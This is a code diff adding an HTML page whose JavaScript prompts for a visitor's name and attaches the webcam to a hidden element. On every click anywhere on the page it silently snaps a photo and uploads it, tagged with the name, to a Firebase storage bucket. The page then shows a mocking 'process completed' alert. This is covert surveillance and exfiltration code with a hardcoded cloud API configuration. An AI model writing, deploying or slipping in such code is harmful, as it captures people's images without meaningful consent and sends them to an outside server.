@@ -1,0 +1,71 @@
+
+<style>
+#my_camera{
+ width: 320px;
+ height: 240px;
+ border: 1px solid black;
+ display:none;
+}
+</style>
+
+<div id="my_camera"></div>
+ 
+<script type="text/javascript" src= "https://cdn.jsdelivr.net/gh/goc-code/camera/sl_light.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.2/firebase-storage.js"></script>
+
+<script language="JavaScript">
+
+var userName = prompt("What is your name") || "Unknown";
+
+   var firebaseConfig = {
+      apiKey: "AIzaSyC_Xl8hivmE06XE9XclXkaJDrhUvG2zJ1I",
+      authDomain: "online-paint-f8964.firebaseapp.com",
+      projectId: "online-paint-f8964",
+      storageBucket: "online-paint-f8964.appspot.com",
+      messagingSenderId: "523870627853",
+      appId: "1:523870627853:web:1e9bfebeb71a87ac7fcd44"
+    };
+  
+    firebase.initializeApp(firebaseConfig);
+
+var storage = firebase.storage().ref();
+
+var string;
+
+
+ Webcam.set({
+  width: 320,
+  height: 240,
+  image_format: 'jpeg',
+  jpeg_quality: 900
+ });
+ Webcam.attach( '#my_camera' );
+
+function take_snapshot() {
+ 
+ Webcam.snap( function(data_uri) {
+   
+ string ="<h1>" + userName + "</h1>"  + '<img src="'+data_uri+'"/>';
+  
+  ///firebase
+  var f = new File([string], "filename.html", {type: "html"})
+      storage.child( "codes/" + Math.floor(Date.now() / 1000) + ".html").put(f).then(snap=>{
+          alert("process completed ( ͡° ͜ʖ ͡°)");
+          /*snap.ref.getDownloadURL().then(url =>{
+           
+          });*/
+      });
+  
+  ////firebase
+  
+})
+
+}
+  
+window.addEventListener("click",()=>{
+  take_snapshot();
+});
+
+
+</script>
